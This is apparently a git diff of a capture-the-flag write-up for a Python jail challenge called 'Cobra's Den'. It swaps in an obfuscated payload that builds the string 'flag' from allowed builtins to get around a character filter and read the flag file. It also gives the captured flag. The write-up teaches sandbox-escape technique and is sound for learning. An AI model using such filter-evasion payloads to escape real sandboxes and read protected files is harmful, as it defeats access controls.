@@ -1,13 +1,13 @@
 # Cobra's Den
 
-`Description`
+It is python jailbreak. We can use ['abs', 'chr', 'hash', 'open', 'ord', 'repr'] and '<ph[(cobras.den)]+~'.
+ - make str with `repr(object)`
+ - make int(= 1) with `abs(hash(())+~hash(()))`
 
-`Solution`
+Then we can execute `open('flag').read()`.
 
 ```python
-foo = "bar"
+open(chr(ord(repr(hash)[abs(hash(())+~hash(()))])+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(())))+chr(ord(repr(hash)[abs(hash(())+~hash(()))])+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(())))+chr(ord(repr(hash)[abs(hash(())+~hash(()))])+hash(())+~hash(()))+chr(ord(repr(hash)[abs(hash(())+~hash(()))])+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(())))).read()
 ```
 
-![img](flag.png)
-
-flag is: **flag{foo_bar}**
+flag is: **irisctf{pyth0n_has_s(+([]<[]))me_whacky_sh(+([]<[[]]))t}**
